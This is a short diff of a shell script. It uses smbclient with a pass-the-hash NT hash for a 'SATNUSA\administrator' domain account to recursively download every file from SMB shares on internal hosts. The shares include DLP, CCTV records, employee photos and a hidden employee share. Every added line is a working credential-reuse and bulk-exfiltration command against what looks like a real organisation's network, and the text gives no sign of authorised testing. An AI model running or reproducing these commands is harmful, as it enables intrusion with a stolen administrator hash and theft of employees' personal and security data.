@@ -6,3 +6,17 @@ printf '70b87fe29b2777310897a77ba7fd5614\n' | smbclient "//192.168.88.14/CCTV Re
 
 smbclient //192.168.88.14/"DLP" -U 'SATNUSA\administrator' --pw-nt-hash 70b87fe29b2777310897a77ba7fd5614 -c "prompt off; recurse; mget *"
 
+
+HASH='70b87fe29b2777310897a77ba7fd5614'
+
+# EmplFoto
+printf "$HASH\n" | smbclient //192.168.88.16/EmplFoto -U 'SATNUSA\administrator' --pw-nt-hash -c 'prompt off; recurse; mget *'
+
+# karyawan$
+printf "$HASH\n" | smbclient //192.168.88.16/karyawan$ -U 'SATNUSA\administrator' --pw-nt-hash -c 'prompt off; recurse; mget *'
+
+# MSI-SOFT
+printf "$HASH\n" | smbclient //192.168.88.16/MSI-SOFT -U 'SATNUSA\administrator' --pw-nt-hash -c 'prompt off; recurse; mget *'
+
+# PISI2000
+printf "$HASH\n" | smbclient //192.168.88.16/PISI2000 -U 'SATNUSA\administrator' --pw-nt-hash -c 'prompt off; recurse; mget *'
